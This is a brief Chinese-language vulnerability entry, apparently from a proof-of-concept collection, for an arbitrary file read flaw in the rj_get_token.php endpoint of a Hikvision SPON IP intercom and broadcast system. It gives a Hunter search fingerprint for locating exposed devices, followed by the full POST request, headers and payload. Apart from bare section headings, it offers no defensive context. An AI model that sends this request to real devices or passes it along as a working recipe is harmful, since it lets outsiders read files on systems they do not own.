# 海康威视SPONIP网络对讲广播系统rj_get_token存在任意文件读取漏洞

- **系统**：海康　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`Hunter：`web.body="vendors/custom/html5.min.js"``
- **请求**：`POST /php/rj_get_token.php HTTP/1.1`
- **关键头**：`Content-Length: 120`　`Content-Type: application/x-www-form-urlencoded; charset=UTF-8`　`X-Requested-With: XMLHttpRequest`

**请求体 / payload**
```
jsondata[url]=rj_get_token.php
```

**其他**
- 海康威视SPON IP网络对讲广播系统rj\_get\_token存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 海康威视SPON IP网络对讲广播系统